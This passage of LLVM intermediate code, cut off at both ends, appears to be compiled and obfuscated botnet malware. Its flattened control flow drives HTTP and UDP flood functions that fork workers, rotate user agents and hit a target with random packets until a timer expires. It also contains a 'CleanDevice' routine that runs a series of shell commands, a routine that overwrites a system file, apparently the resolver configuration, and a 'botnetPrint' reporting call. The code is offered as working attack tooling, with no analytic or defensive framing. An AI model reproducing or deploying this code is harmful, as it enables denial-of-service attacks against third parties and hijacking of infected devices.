  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #3
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #3
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #3
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 1903922722, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1903922722, label %24
    i32 -54269556, label %29
    i32 2016289277, label %43
    i32 -2089087398, label %44
    i32 1194106050, label %50
    i32 1249056486, label %57
    i32 977664937, label %68
    i32 922503665, label %69
    i32 1814354259, label %70
    i32 -449954586, label %71
    i32 1289205074, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 -54269556, i32 1289205074
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #3
  %35 = srem i32 %34, 36
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #3
  %40 = call i32 @fork() #3
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 2016289277, i32 1814354259
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -2089087398, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #3
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 1194106050, i32 922503665
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 1249056486, i32 977664937
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 977664937, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -2089087398, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 -449954586, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 1903922722, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i64 @time(i64* null) #3
  %21 = load i32, i32* %11, align 4
  %22 = sext i32 %21 to i64
  %23 = add nsw i64 %20, %22
  %24 = trunc i64 %23 to i32
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %26 = call i32 (i8*, i8*, ...) @sprintf(i8* %25, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.98, i32 0, i32 0)) #3
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 1734894121, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1734894121, label %27
    i32 -958580740, label %32
    i32 139254170, label %46
    i32 2032435596, label %47
    i32 -1262493440, label %53
    i32 -420887583, label %60
    i32 -1942109765, label %71
    i32 996793658, label %72
    i32 -2064948023, label %73
    i32 -1878806874, label %74
    i32 -1489122686, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  %31 = select i1 %30, i32 -958580740, i32 -1489122686
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #3
  %38 = srem i32 %37, 36
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #3
  %43 = call i32 @fork() #3
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 139254170, i32 -2064948023
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 2032435596, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %15, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @time(i64* null) #3
  %51 = icmp sgt i64 %49, %50
  %52 = select i1 %51, i32 -1262493440, i32 996793658
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i8*, i8** %8, align 8
  %55 = load i16, i16* %9, align 2
  %56 = call i32 @socket_connect(i8* %54, i16 zeroext %55)
  store i32 %56, i32* %13, align 4
  %57 = load i32, i32* %13, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -420887583, i32 -1942109765
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = call i64 @strlen(i8* %63) #9
  %65 = call i64 @write(i32 %61, i8* %62, i64 %64)
  %66 = load i32, i32* %13, align 4
  %67 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %68 = call i64 @read(i32 %66, i8* %67, i64 1)
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @close(i32 %69)
  store i32 -1942109765, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 2032435596, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @exit(i32 0) #11
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  store i32 -1878806874, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %14, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %14, align 4
  store i32 1734894121, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %74, %73, %71, %60, %53, %47, %46, %32, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1057409896, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1057409896, label %first
    i32 1196103504, label %7
    i32 1770710294, label %8
    i32 -114212542, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 1196103504, i32 1770710294
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -114212542, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -114212542, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i32 0, i32 0), i32 0) #3
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1068683861, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1068683861, label %first
    i32 -882407737, label %9
    i32 -747748082, label %17
    i32 -504217613, label %18
    i32 340796661, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ne i32 %.reload, -1
  %8 = select i1 %7, i32 -882407737, i32 -747748082
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i64 @strlen(i8* %10) #9
  store i64 %11, i64* %3, align 8
  %12 = load i16, i16* %1, align 2
  %13 = zext i16 %12 to i32
  %14 = load i8*, i8** %2, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i64 @write(i32 %13, i8* %14, i64 %15)
  store i32 -504217613, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 340796661, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = call i32 @close(i32 %20)
  store i32 340796661, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %18, %17, %9, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.101, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.102, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.103, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.104, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.107, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.108, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.109, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.110, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.111, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -527917755, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -527917755, label %first
    i32 -1132644369, label %38
    i32 -709120089, label %42
    i32 1742743261, label %47
    i32 -558752594, label %53
    i32 -562567910, label %54
    i32 -1467312901, label %61
    i32 -2144855011, label %66
    i32 -1298726075, label %69
    i32 83482845, label %77
    i32 382152736, label %78
    i32 -1742137496, label %90
    i32 1498220284, label %101
    i32 -1582991304, label %105
    i32 -875528883, label %109
    i32 2033110792, label %115
    i32 -623044065, label %116
    i32 911059267, label %117
    i32 -1783849540, label %124
    i32 1667435054, label %128
    i32 333316117, label %131
    i32 -965657782, label %132
    i32 2140476186, label %137
    i32 1313705492, label %140
    i32 1544888025, label %146
    i32 -309781231, label %149
    i32 -1384237397, label %150
    i32 -1314350953, label %155
    i32 -69938598, label %162
    i32 -601347927, label %166
    i32 -853631636, label %167
    i32 -964261314, label %173
    i32 -1338402030, label %213
    i32 -625462971, label %215
    i32 -1810942503, label %220
    i32 679095313, label %247
    i32 1244028375, label %248
    i32 1947671217, label %261
    i32 225417681, label %263
    i32 -1380736289, label %268
    i32 -926615963, label %295
    i32 -589261806, label %301
    i32 -379237973, label %302
    i32 230598538, label %303
    i32 -73098363, label %310
    i32 -1214565096, label %314
    i32 935387703, label %317
    i32 1209456446, label %319
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 -1132644369, i32 -709120089
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 1742743261, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 1742743261, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 -558752594, i32 -562567910
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 -1467312901, i32 -965657782
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -1298726075, i32 -2144855011
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @switchCommStock, align 4
  %68 = call i32 (i32, i8*, ...) @botnetPrint(i32 %67, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #3
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 83482845, i32 382152736
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %83, i32 %84)
  %85 = call i64 @time(i64* null) #3
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = trunc i64 %88 to i32
  store i32 %89, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -1742137496, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %19, align 4
  %92 = load i8*, i8** %20, align 8
  %93 = load i32, i32* %13, align 4
  %94 = sext i32 %93 to i64
  %95 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %96 = call i64 @sendto(i32 %91, i8* %92, i64 %94, i32 0, %struct.sockaddr* %95, i32 16)
  %97 = load i32, i32* %22, align 4
  %98 = load i32, i32* %18, align 4
  %99 = icmp eq i32 %97, %98
  %100 = select i1 %99, i32 1498220284, i32 911059267
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* %10, align 4
  %103 = icmp eq i32 %102, 0
  %104 = select i1 %103, i32 -1582991304, i32 -875528883
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  store i32 -875528883, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = call i64 @time(i64* null) #3
  %111 = load i32, i32* %21, align 4
  %112 = sext i32 %111 to i64
  %113 = icmp sgt i64 %110, %112
  %114 = select i1 %113, i32 2033110792, i32 -623044065
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 333316117, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 -1742137496, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %22, align 4
  %119 = add i32 %118, 1
  store i32 %119, i32* %22, align 4
  %120 = load i32, i32* %23, align 4
  %121 = load i32, i32* %15, align 4
  %122 = icmp eq i32 %120, %121
  %123 = select i1 %122, i32 -1783849540, i32 1667435054
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %16, align 4
  %126 = mul nsw i32 %125, 1000
  %127 = call i32 @usleep(i32 %126)
  store i32 0, i32* %23, align 4
  store i32 -1742137496, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %23, align 4
  %130 = add i32 %129, 1
  store i32 %130, i32* %23, align 4
  store i32 -1742137496, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 1209456446, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %133, i32* %24, align 4
  %134 = load i32, i32* %24, align 4
